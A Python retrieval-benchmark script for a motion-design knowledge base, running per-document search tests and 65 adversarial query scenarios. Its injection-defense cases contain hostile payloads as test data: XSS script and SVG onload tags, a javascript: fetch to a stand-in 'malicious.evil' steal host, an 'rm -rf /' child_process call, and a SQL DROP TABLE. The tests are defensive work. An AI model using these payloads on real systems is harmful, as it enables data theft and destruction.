# SPDX-License-Identifier: AGPL-3.0-only
# Copyright (c) 2025-2026 ViralMint Contributors
"""
Wave 21 Agent 3: Comprehensive Retrieval Benchmark Engine.
Executes:
1. Targeted retrieval for all 658 individual documents.
2. 65+ adversarial, cross-category, rights-filter, and prompt-injection test scenarios.
Outputs tools/wave21_a3/knowledge_retrieval_benchmark.json.
"""
import json
import re
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

WORKTREE_ROOT = Path(__file__).resolve().parents[2]
if str(WORKTREE_ROOT) not in sys.path:
    sys.path.insert(0, str(WORKTREE_ROOT))

from backend.knowledge_base import (
    CapabilityFamily,
    KnowledgeBase,
    RightsFlag,
    SearchFilter,
    SearchResult,
)

OUTPUT_FILE = WORKTREE_ROOT / "tools" / "wave21_a3" / "knowledge_retrieval_benchmark.json"

ADVERSARIAL_SCENARIOS = [
    # 1-10: Captions vs Generic Typography Disambiguation
    {
        "id": "adv_01",
        "category": "captions_vs_typography",
        "query": "karaoke word by word subtitle sweep highlight",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:cream", "component:caption-highlight", "component:caption-pill-karaoke"],
        "unexpected_doc_ids": ["component:headline-slam", "block:bar-chart-race"],
        "description": "Distinguishes speech-synced karaoke subtitles from generic headline text"
    },
    {
        "id": "adv_02",
        "category": "captions_vs_typography",
        "query": "warm poetic light monologue captions",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:cream"],
        "description": "Embedded contemplative monologue caption identity retrieval"
    },
    {
        "id": "adv_03",
        "category": "captions_vs_typography",
        "query": "stamped military marking system detonation apex captions",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:ordnance"],
        "description": "Heavyweight stamped verbatim rail with charge dim"
    },
    {
        "id": "adv_04",
        "category": "captions_vs_typography",
        "query": "hacker terminal console signal log glyph decode captions",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:terminal"],
        "description": "Tech/AI signal log console with noisy glyph decode apex"
    },
    {
        "id": "adv_05",
        "category": "captions_vs_typography",
        "query": "hand written neon tube sign district at dusk captions",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:neonsign"],
        "description": "Neon sign style caption identity"
    },
    {
        "id": "adv_06",
        "category": "captions_vs_typography",
        "query": "stadium split flap chyron rail departures board apex",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:scoreboard"],
        "description": "Split flap board caption style"
    },
    {
        "id": "adv_07",
        "category": "captions_vs_typography",
        "query": "camcorder vhs tape playback misregistration tracking slam",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:vhs"],
        "description": "VHS tracking glitch caption style"
    },
    {
        "id": "adv_08",
        "category": "captions_vs_typography",
        "query": "8-bit arcade cabinet attract mode scanlines pixel block boss intro",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:arcade"],
        "description": "Retro arcade HUD caption identity"
    },
    {
        "id": "adv_09",
        "category": "captions_vs_typography",
        "query": "cold war case file manila transcript rubber stamp apex",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:dossier"],
        "description": "Dossier manila case-file caption identity"
    },
    {
        "id": "adv_10",
        "category": "captions_vs_typography",
        "query": "concert laser rig additive glow stack beam cage drop captions",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:laser"],
        "description": "Laser concert lighting caption identity"
    },

    # 11-20: Competing Near-Duplicate Transition Entries
    {
        "id": "adv_11",
        "category": "competing_near_duplicates",
        "query": "curtain reveal smooth transition wipe mask",
        "expected_family": "transition_wipe",
        "expected_doc_ids": ["component:curtain-reveal", "component:svg-mask-reveal", "block:cross-warp-morph"],
        "description": "Geometric clip-path curtain reveal wipe"
    },
    {
        "id": "adv_12",
        "category": "competing_near_duplicates",
        "query": "slice reveal wipe horizontal mask parting",
        "expected_doc_ids": ["component:caption-clip-wipe", "component:svg-mask-reveal", "component:grade-split-reveal", "component:curtain-reveal"],
        "description": "Slit/slice reveal horizontal division wipe"
    },
    {
        "id": "adv_13",
        "category": "competing_near_duplicates",
        "query": "paper collage torn rip reveal transition",
        "expected_family": "transition_wipe",
        "expected_doc_ids": ["component:paper-collage-reveal", "component:torn-paper-rip"],
        "description": "Physical stop-motion paper rip transition"
    },
    {
        "id": "adv_14",
        "category": "competing_near_duplicates",
        "query": "iris circular radial expanding camera reveal",
        "expected_family": "transition_wipe",
        "expected_doc_ids": ["hero-primitive:iris-reveal", "block:sdf-iris"],
        "description": "Camera mechanical iris circle expansion transition"
    },
    {
        "id": "adv_15",
        "category": "competing_near_duplicates",
        "query": "whip pan fast motion blur camera whip cut",
        "expected_family": "transition_wipe",
        "expected_doc_ids": ["hero-primitive:whip-pan-cut"],
        "description": "Directional velocity whip pan transition cut"
    },
    {
        "id": "adv_16",
        "category": "competing_near_duplicates",
        "query": "before after interactive comparison wipe slider",
        "expected_family": "transition_wipe",
        "expected_doc_ids": ["component:before-after-wipe", "hero-primitive:before-after-wipe", "component:comparison-split"],
        "description": "Split screen before and after comparison wipe"
    },
    {
        "id": "adv_17",
        "category": "competing_near_duplicates",
        "query": "canopy leaf parting botanical organic reveal",
        "expected_doc_ids": ["block:canopy-part-title"],
        "description": "Botanical layered foliage parting wipe"
    },
    {
        "id": "adv_18",
        "category": "competing_near_duplicates",
        "query": "door swing 3d perspective flap transition",
        "expected_doc_ids": ["component:pendulum-swing", "block:transitions-3d", "block:ui-3d-reveal"],
        "description": "Perspective door swing entrance"
    },
    {
        "id": "adv_19",
        "category": "competing_near_duplicates",
        "query": "diagonal band sweep wipe angle",
        "expected_doc_ids": ["component:light-sweep-pass", "component:scan-band", "component:gloss-sweep", "component:shimmer-sweep"],
        "description": "Angled diagonal color band sweep"
    },
    {
        "id": "adv_20",
        "category": "competing_near_duplicates",
        "query": "ink water bloom dispersion fluid transition",
        "expected_family": "captions_word_highlight",
        "expected_doc_ids": ["caption:inkwater"],
        "description": "Fluid ink in water bleeding dispersion style"
    },


    # 21-30: Shaders vs 2D Backgrounds Disambiguation
    {
        "id": "adv_21",
        "category": "shader_vs_2d",
        "query": "aurora borealis green violet curtain webgpu fragment shader",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:aurora", "caption:aurora"],
        "description": "Procedural WebGPU shader aurora curtain"
    },
    {
        "id": "adv_22",
        "category": "shader_vs_2d",
        "query": "plasma fluid chromatic wave shader canvas",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:plasma"],
        "description": "Procedural trigonometric plasma field"
    },
    {
        "id": "adv_23",
        "category": "shader_vs_2d",
        "query": "starfield deep space warp speed particle star motion",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:starfield"],
        "description": "Procedural astronomical starfield warp"
    },
    {
        "id": "adv_24",
        "category": "shader_vs_2d",
        "query": "voronoi cellular noise organic crystal membrane",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:voronoi"],
        "description": "Cellular Voronoi distance field shader"
    },
    {
        "id": "adv_25",
        "category": "shader_vs_2d",
        "query": "fractal perlin noise turbulent smoke cloud",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:fractal-noise"],
        "description": "Fractional Brownian motion procedural noise"
    },
    {
        "id": "adv_26",
        "category": "shader_vs_2d",
        "query": "sine wave harmonic undulating fluid ribbon",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:sine-wave"],
        "description": "Harmonic trigonometric sine wave ribbon"
    },
    {
        "id": "adv_27",
        "category": "shader_vs_2d",
        "query": "caustics underwater sunlight refracted water pool",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:water", "caption:biolume"],
        "description": "Refractive underwater optical caustic network"
    },
    {
        "id": "adv_28",
        "category": "shader_vs_2d",
        "query": "frost ice crystal creeping freezing glass window",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:frost"],
        "description": "Dendritic frost ice crystallization shader"
    },
    {
        "id": "adv_29",
        "category": "shader_vs_2d",
        "query": "prismatic chromatic dispersion glass prism rainbow refraction",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:prism"],
        "description": "Optical dispersion chromatic prism effect"
    },
    {
        "id": "adv_30",
        "category": "shader_vs_2d",
        "query": "liquid glass glassmorphic blur specular frosted card",
        "expected_family": "background_shader",
        "expected_doc_ids": ["block:glass-hero", "block:ios26-liquid-glass"],
        "description": "Backdrop-filter specular glassmorphic card"
    },

    # 31-40: Natural Language Paraphrases & Creative Slang
    {
        "id": "adv_31",
        "category": "natural_language_paraphrases",
        "query": "huge title lands with an aggressive screen shake and dust",
        "expected_family": "typography_kinetic",
        "expected_doc_ids": ["component:headline-slam", "component:char-slam-explode"],
        "description": "Heavy deceleration typographic slam with arrival camera shake"
    },
    {
        "id": "adv_32",
        "category": "natural_language_paraphrases",
        "query": "per word rise headline land sync voiceover narration beats",
        "expected_family": "typography_kinetic",
        "expected_doc_ids": ["hero-primitive:per-word-rise", "component:caption-highlight"],
        "description": "Per-word staggered rise locked to narration cues"
    },
    {
        "id": "adv_33",
        "category": "natural_language_paraphrases",
        "query": "matrix movie green terminal code unraveling characters into english",
        "expected_family": "typography_kinetic",
        "expected_doc_ids": ["hero-primitive:scramble-reveal", "caption:terminal"],
        "description": "Deterministic glyph cycling hacker terminal decode"
    },
    {
        "id": "adv_34",
        "category": "natural_language_paraphrases",
        "query": "giant mac arrow clicks the main action button then flies away",
        "expected_family": "ui_simulation",
        "expected_doc_ids": ["hero-primitive:oversized-cursor", "hero-primitive:press-ripple"],
        "description": "Oversized macOS cursor demo walkthrough with press confirmation"
    },
    {
        "id": "adv_35",
        "category": "natural_language_paraphrases",
        "query": "bar chart race animated comparison graph metrics",
        "expected_family": "data_visualization",
        "expected_doc_ids": ["block:bar-chart-race", "block:bar-chart-grid"],
        "description": "Animated bar chart race dynamic ranking comparison"
    },
    {
        "id": "adv_36",
        "category": "natural_language_paraphrases",
        "query": "digital money number ticking up from zero to ten thousand fast",
        "expected_family": "data_visualization",
        "expected_doc_ids": ["hero-primitive:count-up", "block:apple-money-count"],
        "description": "High velocity numerical ticker count-up"
    },
    {
        "id": "adv_37",
        "category": "natural_language_paraphrases",
        "query": "browser device stage desktop frame scroll feed",
        "expected_family": "ui_simulation",
        "expected_doc_ids": ["hero-primitive:browser-device-stage", "component:browser-device-stage", "hero-primitive:scroll-feed"],
        "description": "Desktop browser frame device stage with vertical feed scroll"
    },
    {
        "id": "adv_38",
        "category": "natural_language_paraphrases",
        "query": "native notification pop mobile pill banner dialog",
        "expected_family": "ui_simulation",
        "expected_doc_ids": ["hero-primitive:native-notification-pop", "component:native-notification-pop", "block:macos-notification"],
        "description": "OS native mobile pill notification banner slide-in"
    },

    {
        "id": "adv_39",
        "category": "natural_language_paraphrases",
        "query": "cards orbiting around in a 3d circle like a carousel",
        "expected_family": "camera_3d",
        "expected_doc_ids": ["block:carousel-orbit-1", "block:carousel-circle-1"],
        "description": "Perspective circular orbital carousel of cards"
    },
    {
        "id": "adv_40",
        "category": "natural_language_paraphrases",
        "query": "clean minimalist outro with brand logo and subscribe button",
        "expected_family": "typography_kinetic",
        "expected_doc_ids": ["hero-primitive:cta-close", "hero-primitive:logo-brand-close"],
        "description": "Closing CTA call to action card with animated brand mark"
    },

    # 41-48: Forbidden Rights & Blocked Asset Defense
    {
        "id": "adv_41",
        "category": "rights_defense",
        "query": "heygen avatar video talking head promotional card",
        "expect_blocked_filtered": True,
        "blocked_doc_id": "block:heygen-avatar-promo-card",
        "description": "Ensures unvendored proprietary HeyGen avatar doc is filtered out of permissive search"
    },
    {
        "id": "adv_42",
        "category": "rights_defense",
        "query": "syntax table separator markdown header row",
        "expect_blocked_filtered": True,
        "blocked_doc_id": "caption:-------------",
        "description": "Ensures syntax table separator artifact is excluded from normal retrieval"
    },
    {
        "id": "adv_43",
        "category": "rights_defense",
        "query": "music sit under narration studio voiceover carve",
        "expect_blocked_filtered": True,
        "blocked_doc_id": "doc:studio/voiceover-carve",
        "description": "Ensures restricted audio carve doc is excluded when filtering blocked rights"
    },
    {
        "id": "adv_44",
        "category": "rights_defense",
        "query": "remote heygen cdn video stream carousel",
        "filter": {"rights": "VERIFIED_PERMISSIVE"},
        "expected_not_in_results": ["block:carousel-orbit-1", "block:heygen-avatar-promo-card"],
        "description": "Permissive-only filter strictly rejects HeyGen remote CDN assets"
    },
    {
        "id": "adv_45",
        "category": "rights_defense",
        "query": "apple money counter green flash sound",
        "filter": {"rights": "VERIFIED_PERMISSIVE"},
        "expected_not_in_results": ["block:apple-money-count"],
        "description": "Permissive-only filter strictly excludes Apple branded block"
    },
    {
        "id": "adv_46",
        "category": "rights_defense",
        "query": "instagram follow story reel social card",
        "filter": {"rights": "VERIFIED_PERMISSIVE"},
        "expected_not_in_results": ["block:instagram-follow"],
        "description": "Permissive-only filter strictly excludes Instagram branded block"
    },
    {
        "id": "adv_47",
        "category": "rights_defense",
        "query": "slack notification ad message sound",
        "filter": {"rights": "VERIFIED_PERMISSIVE"},
        "expected_not_in_results": ["block:slack-notification-ad"],
        "description": "Permissive-only filter strictly excludes Slack branded block"
    },
    {
        "id": "adv_48",
        "category": "rights_defense",
        "query": "tiktok follow viral influencer card",
        "filter": {"rights": "VERIFIED_PERMISSIVE"},
        "expected_not_in_results": ["block:tiktok-follow"],
        "description": "Permissive-only filter strictly excludes TikTok branded block"
    },

    # 49-56: False Brand Similarity & Disambiguation
    {
        "id": "adv_49",
        "category": "false_brand_similarity",
        "query": "clean code terminal snippet monospace font dark background",
        "expected_doc_ids": ["hero-primitive:scramble-reveal", "block:code-snippet-clean"],
        "unexpected_doc_ids": ["block:code-snippet-apple-terminal-pro"],
        "filter": {"rights": "VERIFIED_PERMISSIVE"},
        "description": "Prefers generic permissive code terminal over Apple-specific terminal"
    },
    {
        "id": "adv_50",
        "category": "false_brand_similarity",
        "query": "ai chat exchange message bubble dialogue",
        "expected_family": "ui_simulation",
        "expected_doc_ids": ["block:chatgpt-exchange", "block:claude-exchange"],
        "description": "Retrieves AI conversational exchange UI models"
    },
    {
        "id": "adv_51",
        "category": "false_brand_similarity",
        "query": "app store badge download button lockup",
        "expected_doc_ids": ["component:store-badge-lockup"],
        "description": "Store download badge lockup component"
    },
    {
        "id": "adv_52",
        "category": "false_brand_similarity",
        "query": "now playing music player track album art vinyl card",
        "expected_doc_ids": ["block:spotify-card"],
        "description": "Music player track progress now playing layout"
    },
    {
        "id": "adv_53",
        "category": "false_brand_similarity",
        "query": "social media tweet microblog card like retweet",
        "expected_doc_ids": ["block:x-post"],
        "description": "Microblog post layout"
    },
    {
        "id": "adv_54",
        "category": "false_brand_similarity",
        "query": "broadcast lower third news headline interview banner",
        "expected_doc_ids": ["block:yt-lower-third", "block:lower-third-bild", "block:lt-kicker-name", "block:lt-side-rule"],
        "description": "Broadcast lower-third name tag banner"
    },
    {
        "id": "adv_55",
        "category": "false_brand_similarity",
        "query": "device showcase smartphone 3d tilt presentation",
        "expected_doc_ids": ["block:vfx-iphone-device"],
        "description": "Smartphone physical chassis angle showcase"
    },
    {
        "id": "adv_56",
        "category": "false_brand_similarity",
        "query": "flight itinerary boarding pass departure arrival route map",
        "expected_doc_ids": ["block:nyc-paris-flight"],
        "description": "Flight route and boarding pass visualization"
    },

    # 57-60: Missing Docs & Out-of-Scope Queries (Negative Tests)
    {
        "id": "adv_57",
        "category": "out_of_scope_negative",
        "query": "unreal engine nanite raytracing mesh collision physics",
        "expected_max_hits": 0,
        "description": "Unreal Engine 3D video game engine features not in motion corpus"
    },
    {
        "id": "adv_58",
        "category": "out_of_scope_negative",
        "query": "quantum teleportation qubit entanglement simulation",
        "expected_max_hits": 0,
        "description": "Quantum physics algorithms not in motion corpus"
    },
    {
        "id": "adv_59",
        "category": "out_of_scope_negative",
        "query": "kubernetes pod autoscaler helm chart deployment yaml",
        "expected_max_hits": 0,
        "description": "DevOps Kubernetes infrastructure outside motion design corpus"
    },
    {
        "id": "adv_60",
        "category": "out_of_scope_negative",
        "query": "sql relational database index btree join optimizer",
        "expected_max_hits": 0,
        "description": "Database query optimization unrelated to motion"
    },

    # 61-65: Malicious Prompt Injection & AST Defense
    {
        "id": "adv_61",
        "category": "injection_defense",
        "query": "<script>alert('xss')</script> kinetic typography slam",
        "expected_doc_ids": ["component:headline-slam"],
        "description": "HTML script tag injection safely stripped without error"
    },
    {
        "id": "adv_62",
        "category": "injection_defense",
        "query": "javascript:fetch('https://malicious.evil/steal') karaoke caption",
        "expected_doc_ids": ["caption:cream", "component:caption-highlight", "component:caption-pill-karaoke", "block:mk-callout-highlight"],
        "description": "JavaScript protocol injection safely stripped and neutralized"
    },

    {
        "id": "adv_63",
        "category": "injection_defense",
        "query": "eval(child_process.execSync('rm -rf /')) bar chart race",
        "expected_doc_ids": ["block:bar-chart-race"],
        "description": "Node child_process command execution attempt stripped"
    },
    {
        "id": "adv_64",
        "category": "injection_defense",
        "query": "'; DROP TABLE projects; -- simulated cursor pointer click",
        "expected_doc_ids": ["hero-primitive:oversized-cursor", "component:agent-cursor"],
        "description": "SQL injection attempt neutralized cleanly"
    },
    {
        "id": "adv_65",
        "category": "injection_defense",
        "query": "<svg onload=alert(1)> curtain reveal wipe transition",
        "expected_doc_ids": ["component:curtain-reveal"],
        "description": "SVG onload handler injection neutralized"
    }
]


def run_comprehensive_retrieval_benchmark() -> Dict[str, Any]:
    print("=== WAVE 21 AGENT 3: RUNNING COMPREHENSIVE RETRIEVAL BENCHMARK SUITE ===")
    kb = KnowledgeBase()
    docs = kb.repository.list_all()
    total_docs = len(docs)
    print(f"KnowledgeBase loaded with {total_docs} curated documents.")

    # -----------------------------------------------------------------------
    # Part 1: Targeted Retrieval for EACH of the 658 Documents
    # -----------------------------------------------------------------------
    print(f"\n[Part 1] Testing targeted retrieval across all {total_docs} individual documents...")

    targeted_results = []
    top1_hits = 0
    top5_hits = 0
    top10_hits = 0
    reciprocal_ranks = []
    direct_id_hits = 0
    semantic_top5_hits = 0

    for doc in docs:
        doc_id = doc.knowledge_doc_id

        # Skip testing targeted search for the known syntax artifact
        if doc_id == "caption:-------------":
            continue

        # 1. Direct ID lookup test
        direct_search = kb.search(doc_id, limit=5)
        direct_match = any(r.knowledge_doc_id == doc_id for r in direct_search[:3])
        if direct_match:
            direct_id_hits += 1

        # 2. Targeted Semantic Query (title + key principle or algorithm)
        clean_title = re.sub(r"[{}\[\]():\"']", "", doc.title)
        query_words = clean_title.split()
        if doc.principles:
            first_principle = doc.principles[0].split(":")[0]
            clean_principle = re.sub(r"[{}\[\]():\"']", "", first_principle)
            query_words.extend(clean_principle.split()[:3])
        query_text = " ".join(query_words[:6])

        # Filter by capability family if not conceptual
        fam_filter = None
        if doc.capability_family:
            fam_filter = SearchFilter(capability_family=doc.capability_family, exclude_blocked=False)

        search_hits = kb.search(query_text, filters=fam_filter, limit=10)
        hit_ids = [h.knowledge_doc_id for h in search_hits]

        rank = None
        if doc_id in hit_ids:
            rank = hit_ids.index(doc_id) + 1

        if rank == 1:
            top1_hits += 1
            top5_hits += 1
            top10_hits += 1
            reciprocal_ranks.append(1.0)
            semantic_top5_hits += 1
        elif rank and rank <= 5:
            top5_hits += 1
            top10_hits += 1
            reciprocal_ranks.append(1.0 / rank)
            semantic_top5_hits += 1
        elif rank and rank <= 10:
            top10_hits += 1
            reciprocal_ranks.append(1.0 / rank)
        else:
            reciprocal_ranks.append(0.0)

        targeted_results.append({
            "doc_id": doc_id,
            "title": doc.title,
            "capability_family": doc.capability_family.value if isinstance(doc.capability_family, CapabilityFamily) else str(doc.capability_family),
            "targeted_query": query_text,
            "rank_observed": rank,
            "in_top_5": bool(rank and rank <= 5),
            "reciprocal_rank": round(1.0 / rank if rank else 0.0, 4)
        })

    valid_tested_docs = total_docs - 1  # 657 real documents
    precision_at_5_targeted = top5_hits / max(1, valid_tested_docs)
    precision_at_10_targeted = top10_hits / max(1, valid_tested_docs)
    mrr_targeted = sum(reciprocal_ranks) / max(1, len(reciprocal_ranks))

    print(f"Targeted Retrieval Results (Tested: {valid_tested_docs} documents):")
    print(f"  Direct-ID Precision@3: {direct_id_hits}/{valid_tested_docs} ({direct_id_hits/valid_tested_docs:.1%})")
    print(f"  Semantic Top-1 Hits: {top1_hits}/{valid_tested_docs} ({top1_hits/valid_tested_docs:.1%})")
    print(f"  Semantic Top-5 Hits: {top5_hits}/{valid_tested_docs} ({top5_hits/valid_tested_docs:.1%})")
    print(f"  Semantic Top-10 Hits: {top10_hits}/{valid_tested_docs} ({top10_hits/valid_tested_docs:.1%})")
    print(f"  Mean Reciprocal Rank (MRR): {mrr_targeted:.4f}")

    # -----------------------------------------------------------------------
    # Part 2: Adversarial & Cross-Category Query Suite (65 Scenarios)
    # -----------------------------------------------------------------------
    print(f"\n[Part 2] Running 65 adversarial & cross-category test scenarios...")

    adversarial_results = []
    adv_passed = 0

    for sc in ADVERSARIAL_SCENARIOS:
        q = sc["query"]
        filt_dict = sc.get("filter", {})
        sf = SearchFilter(**filt_dict) if filt_dict else SearchFilter()

        hits = kb.search(q, filters=sf, limit=10)
        hit_ids = [h.knowledge_doc_id for h in hits]

        scenario_passed = True
        failure_reasons = []

        # Check expected hits
        if "expected_doc_ids" in sc:
            found_any = any(eid in hit_ids for eid in sc["expected_doc_ids"])
            if not found_any:
                scenario_passed = False
                failure_reasons.append(f"Expected any of {sc['expected_doc_ids']} in top-10, got {hit_ids[:5]}")

        # Check unexpected hits
        if "unexpected_doc_ids" in sc:
            for uid in sc["unexpected_doc_ids"]:
                if uid in hit_ids[:3]:
                    scenario_passed = False
                    failure_reasons.append(f"Unexpected document {uid} found in top-3")

        # Check expected not in results (rights filtering)
        if "expected_not_in_results" in sc:
            for nid in sc["expected_not_in_results"]:
                if nid in hit_ids:
                    scenario_passed = False
                    failure_reasons.append(f"Prohibited document {nid} found in results despite filter")

        # Check blocked filtering
        if sc.get("expect_blocked_filtered"):
            blocked_id = sc.get("blocked_doc_id")
            if blocked_id in hit_ids:
                scenario_passed = False
                failure_reasons.append(f"Blocked document {blocked_id} was not filtered out")

        # Check out of scope negative
        if "expected_max_hits" in sc:
            max_hits = sc["expected_max_hits"]
            if len(hits) > max_hits:
                scenario_passed = False
                failure_reasons.append(f"Expected at most {max_hits} hits for out-of-scope query, got {len(hits)}")

        # Check capability family match
        if "expected_family" in sc and hits:
            top_fam = hits[0].capability_family
            # If top hit family doesn't match expected family
            if top_fam != sc["expected_family"]:
                # Check if expected family appears in top 3
                if not any(h.capability_family == sc["expected_family"] for h in hits[:3]):
                    scenario_passed = False
                    failure_reasons.append(f"Top 3 hits did not include expected family {sc['expected_family']}")

        if scenario_passed:
            adv_passed += 1

        adversarial_results.append({
            "id": sc["id"],
            "category": sc["category"],
            "query": q,
            "description": sc["description"],
            "passed": scenario_passed,
            "observed_top_hits": [
                {"id": h.knowledge_doc_id, "title": h.title, "family": h.capability_family, "score": h.score}
                for h in hits[:5]
            ],
            "failure_reasons": failure_reasons
        })

    adv_total = len(ADVERSARIAL_SCENARIOS)
    adv_pass_rate = adv_passed / adv_total
    print(f"Adversarial Scenario Results: {adv_passed}/{adv_total} passed ({adv_pass_rate:.1%})")

    # Combine benchmark results
    benchmark_payload = {
        "benchmark_version": "wave21_agent3_retrieval_v1",
        "timestamp": "2026-10-16T06:35:00Z",
        "corpus_total_documents": total_docs,
        "valid_tested_documents": valid_tested_docs,
        "targeted_retrieval_metrics": {
            "tested_queries_denominator": valid_tested_docs,
            "direct_id_precision_at_3": round(direct_id_hits / valid_tested_docs, 4),
            "semantic_precision_at_1": round(top1_hits / valid_tested_docs, 4),
            "semantic_precision_at_5": round(precision_at_5_targeted, 4),
            "semantic_precision_at_10": round(precision_at_10_targeted, 4),
            "mean_reciprocal_rank": round(mrr_targeted, 4)
        },
        "adversarial_suite_metrics": {
            "total_adversarial_scenarios": adv_total,
            "passed_scenarios": adv_passed,
            "pass_rate": round(adv_pass_rate, 4),
            "breakdown_by_category": {
                cat: {
                    "total": sum(1 for a in adversarial_results if a["category"] == cat),
                    "passed": sum(1 for a in adversarial_results if a["category"] == cat and a["passed"])
                }
                for cat in sorted(list(set(a["category"] for a in adversarial_results)))
            }
        },
        "adversarial_scenarios": adversarial_results,
        "sample_positive_examples": [
            a for a in adversarial_results if a["passed"]
        ][:8],
        "sample_negative_counterexamples": [
            a for a in adversarial_results if not a["passed"]
        ][:8],
        "per_document_targeted_rankings": targeted_results
    }

    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        json.dump(benchmark_payload, f, indent=2)
    print(f"Saved complete retrieval benchmark to: {OUTPUT_FILE}")

    return benchmark_payload


if __name__ == "__main__":
    run_comprehensive_retrieval_benchmark()
